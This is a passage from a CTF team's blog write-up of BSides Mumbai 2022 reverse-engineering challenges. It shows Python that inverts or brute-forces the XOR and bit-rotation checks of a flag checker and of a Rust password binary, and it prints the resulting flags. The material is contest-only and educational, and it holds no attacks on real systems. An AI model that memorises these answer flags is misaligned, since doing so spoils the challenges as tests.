qq <span style="color:#f92672">=</span> (<span style="color:#ae81ff">498447548</span>, <span style="color:#ae81ff">3732380986</span>, <span style="color:#ae81ff">1488213715</span>, <span style="color:#ae81ff">2972884408</span>, <span style="color:#ae81ff">3671789619</span>, <span style="color:#ae81ff">1370551614</span>, <span style="color:#ae81ff">1547410907</span>, <span style="color:#ae81ff">3107329395</span>, <span style="color:#ae81ff">299046427</span>, <span style="color:#ae81ff">2038167384</span>, <span style="color:#ae81ff">974344249</span>, <span style="color:#ae81ff">1531985406</span>, <span style="color:#ae81ff">2620489075</span>, <span style="color:#ae81ff">301338675</span>, <span style="color:#ae81ff">1367072094</span>, <span style="color:#ae81ff">1010523443</span>, <span style="color:#ae81ff">1364594739</span>, <span style="color:#ae81ff">1362851550</span>, <span style="color:#ae81ff">3157990840</span>, <span style="color:#ae81ff">3671465363</span>, <span style="color:#ae81ff">4054904883</span>, <span style="color:#ae81ff">1369151198</span>, <span style="color:#ae81ff">3158031800</span>, <span style="color:#ae81ff">3671465299</span>, <span style="color:#ae81ff">833682835</span>, <span style="color:#ae81ff">4049313075</span>, <span style="color:#ae81ff">1369141299</span>, <span style="color:#ae81ff">1362867902</span>, <span style="color:#ae81ff">3694861656</span>, <span style="color:#ae81ff">985013651</span>, <span style="color:#ae81ff">4048590195</span>, <span style="color:#ae81ff">295403003</span>, <span style="color:#ae81ff">2575023507</span>, <span style="color:#ae81ff">4059258195</span>, <span style="color:#ae81ff">832296243</span>, <span style="color:#ae81ff">1364966747</span>, <span style="color:#ae81ff">960197747</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check2</span>(r):
    r1 <span style="color:#f92672">=</span> (r <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">254</span>
    r2 <span style="color:#f92672">=</span> ((r <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">186</span>
    r3 <span style="color:#f92672">=</span> ((r <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">202</span>
    r4 <span style="color:#f92672">=</span> ((r <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">190</span>
    <span style="color:#66d9ef">return</span> (r4 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">|</span> (r3 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">|</span> (r2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> r1

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(s):
    l <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>):
        r <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(s[i:i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>], <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">3735928559</span>
        n <span style="color:#f92672">=</span> check2(r)
        l<span style="color:#f92672">.</span>append(ror(r, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">32</span>))
    <span style="color:#66d9ef">return</span> l

str <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;Enter a string: &#39;</span>)<span style="color:#f92672">.</span>encode()

<span style="color:#66d9ef">if</span> len(str) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">40</span>:
    sys<span style="color:#f92672">.</span>exit()

m <span style="color:#f92672">=</span> check(str)

<span style="color:#66d9ef">for</span> i, j <span style="color:#f92672">in</span> zip(m, qq):
    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> j:
        print(<span style="color:#e6db74">&#39;dasnot it mofo&#39;</span>)
        sys<span style="color:#f92672">.</span>exit()

print(<span style="color:#e6db74">&#39;GGWP bro&#39;</span>)
</code></pre></div><p>We wrote the following program to get the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ror <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> val, r_bits, max_bits: ((val <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> max_bits <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&gt;&gt;</span> (r_bits <span style="color:#f92672">%</span> max_bits)) <span style="color:#f92672">|</span> ((val <span style="color:#f92672">&lt;&lt;</span> (max_bits <span style="color:#f92672">-</span> (r_bits <span style="color:#f92672">%</span> max_bits)) <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> max_bits <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)))
qq <span style="color:#f92672">=</span> (<span style="color:#ae81ff">498447548</span>, <span style="color:#ae81ff">3732380986</span>, <span style="color:#ae81ff">1488213715</span>, <span style="color:#ae81ff">2972884408</span>, <span style="color:#ae81ff">3671789619</span>, <span style="color:#ae81ff">1370551614</span>, <span style="color:#ae81ff">1547410907</span>, <span style="color:#ae81ff">3107329395</span>, <span style="color:#ae81ff">299046427</span>, <span style="color:#ae81ff">2038167384</span>, <span style="color:#ae81ff">974344249</span>, <span style="color:#ae81ff">1531985406</span>, <span style="color:#ae81ff">2620489075</span>, <span style="color:#ae81ff">301338675</span>, <span style="color:#ae81ff">1367072094</span>, <span style="color:#ae81ff">1010523443</span>, <span style="color:#ae81ff">1364594739</span>, <span style="color:#ae81ff">1362851550</span>, <span style="color:#ae81ff">3157990840</span>, <span style="color:#ae81ff">3671465363</span>, <span style="color:#ae81ff">4054904883</span>, <span style="color:#ae81ff">1369151198</span>, <span style="color:#ae81ff">3158031800</span>, <span style="color:#ae81ff">3671465299</span>, <span style="color:#ae81ff">833682835</span>, <span style="color:#ae81ff">4049313075</span>, <span style="color:#ae81ff">1369141299</span>, <span style="color:#ae81ff">1362867902</span>, <span style="color:#ae81ff">3694861656</span>, <span style="color:#ae81ff">985013651</span>, <span style="color:#ae81ff">4048590195</span>, <span style="color:#ae81ff">295403003</span>, <span style="color:#ae81ff">2575023507</span>, <span style="color:#ae81ff">4059258195</span>, <span style="color:#ae81ff">832296243</span>, <span style="color:#ae81ff">1364966747</span>, <span style="color:#ae81ff">960197747</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check2</span>(r):
    r1 <span style="color:#f92672">=</span> (r <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">254</span>
    r2 <span style="color:#f92672">=</span> ((r <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">186</span>
    r3 <span style="color:#f92672">=</span> ((r <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">202</span>
    r4 <span style="color:#f92672">=</span> ((r <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">190</span>
    <span style="color:#66d9ef">return</span> (r4 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">|</span> (r3 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">|</span> (r2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> r1

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_rev</span>(r):
    <span style="color:#66d9ef">return</span> bytes<span style="color:#f92672">.</span>fromhex(hex(ror(r, <span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">32</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">3735928559</span>)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>))[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]

qq_rev <span style="color:#f92672">=</span> [check_rev(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> qq]
print((<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([a[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> qq_rev[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]]) <span style="color:#f92672">+</span> qq_rev[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode())
</code></pre></div><p>The flag is <code>BSM{7h3_w0und_15_47_h32_h3427_k42u124w4}</code>.</p>
<h3 id="piano">Piano<a hidden class="anchor" aria-hidden="true" href="#piano">#</a></h3>
<p><em>Solved by fsharp</em></p>
<p>We&rsquo;re given a Rust binary that checks if the entered password is 65 characters long, then subjects each character in the password to a series of bit shifts and XORs. The password&rsquo;s correct if these characters all match 65 given bytes. Given how safe Rust is by default, only a very small portion of the disassembled program is relevant, and the rest is mostly for dealing with errors like integer overflows.</p>
<p>The program logic is roughly as follows in Python:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys

pw <span style="color:#f92672">=</span> bytearray(input(<span style="color:#e6db74">&#34;Enter something:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode())
encoded <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;66cf77b25360f45e8ba8426aa77217d7fce8f2c4e427120ccf5d857a68d7b5c8570f59588d14896abea468dbf3d0a00fe03b8ba9ca8ddebd138338e0624ff8109a&#34;</span>)

<span style="color:#66d9ef">if</span> len(pw) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">65</span>:
    print(<span style="color:#e6db74">&#34;Hmmm...&#34;</span>)
    sys<span style="color:#f92672">.</span>exit()

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(pw)):
    c <span style="color:#f92672">=</span> pw[i]
    shift_amount <span style="color:#f92672">=</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span>
    <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        shifted <span style="color:#f92672">=</span> ((c <span style="color:#f92672">&gt;&gt;</span> shift_amount) <span style="color:#f92672">|</span> (c <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> shift_amount))) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
        shifted <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x24</span>
    <span style="color:#66d9ef">else</span>:
        shifted <span style="color:#f92672">=</span> ((c <span style="color:#f92672">&lt;&lt;</span> shift_amount) <span style="color:#f92672">|</span> (c <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> shift_amount))) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
        shifted <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x69</span>
    pw[i] <span style="color:#f92672">=</span> shifted

<span style="color:#66d9ef">if</span> pw <span style="color:#f92672">==</span> encoded:
    print(<span style="color:#e6db74">&#34;Good Job ^^&#34;</span>)
</code></pre></div><p>Rather than going through the tedium of undoing the XORs and bit shifts, a small Python program is written to bruteforce each character as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">encoded <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;66cf77b25360f45e8ba8426aa77217d7fce8f2c4e427120ccf5d857a68d7b5c8570f59588d14896abea468dbf3d0a00fe03b8ba9ca8ddebd138338e0624ff8109a&#34;</span>)
flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(encoded)):
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">127</span>):
        shift_amount <span style="color:#f92672">=</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span>
        <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            shifted <span style="color:#f92672">=</span> ((c <span style="color:#f92672">&gt;&gt;</span> shift_amount) <span style="color:#f92672">|</span> (c <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> shift_amount))) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
            shifted <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x24</span>
        <span style="color:#66d9ef">else</span>:
            shifted <span style="color:#f92672">=</span> ((c <span style="color:#f92672">&lt;&lt;</span> shift_amount) <span style="color:#f92672">|</span> (c <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> shift_amount))) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
            shifted <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x69</span>
        <span style="color:#66d9ef">if</span> shifted <span style="color:#f92672">==</span> encoded[i]:
            flag <span style="color:#f92672">+=</span> chr(c)
            <span style="color:#66d9ef">break</span>

print(flag)
</code></pre></div><p>The flag is <code>BSM{wH47_p30pl3_c0mm0NlY_C4LL_F473_1S_m0S7LY_7H31R_0wN_S7up1d17y}</code>.</p>

</div>
  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
      <li><a href="https://b6a.black/tags/bsides-mumbai/">bsides-mumbai</a></li>
    </ul>
    <nav class="paginav">
      <a class="next" href="https://b6a.black/posts/2022-03-03-tsjctf/">
        <span class="title">Next Page »</span>
        <br>
        <span>TSJ CTF 2022 Writeup</span>
      </a>
    </nav>
  </footer>
</article>
<aside class="toc-container">
  <a href="#" style="text-decoration: none; font-weight: 700;">
    Bsides Mumbai 2022 Writeup
  </a>
  <div class="js-toc"></div>
</aside>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>

<script type="text/javascript">
  tocbot.init({
    headingSelector: 'h1, h2, h3, h4',
    orderedList: false,
    headingLabelCallback: s => s.substr(0, s.length-1),
    collapseDepth: 2
  });
</script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
<script type="text/javascript">
  (function () {
    const vizPrefix = "language-viz-";
    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
      let engine;
      x.getAttribute("class").split(" ").forEach(function (cls) {
        if (cls.startsWith(vizPrefix)) {
          engine = cls.substr(vizPrefix.length);
        }
      });
      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
      x.parentNode.insertBefore(image.documentElement, x);
      x.style.display = 'none'
      x.parentNode.style.backgroundColor = "white"
    });
  })();
</script>
    </main><footer class="footer">
    <span>&copy; 2022 <a href="https://b6a.black/">Black Bauhinia</a></span>
    <span>&middot;</span>
    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
    <span>&middot;</span>
    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>



<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<script>
    window.onload = function () {
        if (localStorage.getItem("menu-scroll-position")) {
            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
        }
    }
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

    function menu_on_scroll() {
        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
    }

</script>

</body>

</html>
